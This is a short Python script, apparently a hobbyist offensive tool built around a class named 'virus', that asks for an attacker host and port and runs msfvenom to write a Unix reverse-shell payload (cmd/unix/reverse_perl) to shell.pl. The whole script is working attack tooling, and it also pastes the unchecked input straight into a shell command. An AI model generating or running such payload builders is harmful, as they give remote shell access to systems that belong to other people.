import os
import sys
import subprocess
def clear():
    subprocess.call("clear")

class virus():
    clear()
    f = input("add lhost=>")
    print("lhost =>" + " " + f)
    r = input("add lport=>")
    print("lport => " + " " + r)
    os.system("msfvenom -p cmd/unix/reverse_perl LHOST=" + f + " " + "LPORT=" + r + " " + "-f raw > shell.pl")